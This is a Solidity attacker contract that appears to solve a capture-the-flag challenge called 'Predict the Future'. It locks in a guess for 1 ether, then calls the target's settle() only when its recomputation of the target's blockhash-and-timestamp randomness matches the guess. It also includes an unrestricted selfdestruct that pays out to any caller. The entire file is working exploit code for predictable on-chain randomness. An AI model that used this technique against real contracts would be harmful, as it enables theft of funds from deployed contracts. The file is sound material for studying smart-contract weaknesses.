pragma solidity ^0.4.21;

interface PredictTheFutureChallenge{
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract predictTheFuture{
    uint8 answer = 3;
    PredictTheFutureChallenge public target;

    function setTargetContract(address _target) public{
        target = PredictTheFutureChallenge(_target);
    }

    function guess() public{
        target.lockInGuess.value(1 ether)(answer);
    }

    function success() public {
        if(answer == (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10)){
            target.settle();
        }
    }

    function readAnswer() public view returns(uint8, uint8){
        return (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10, answer);
    }

    function destroy() public{
        selfdestruct(msg.sender);
    }

    function() external payable {}
}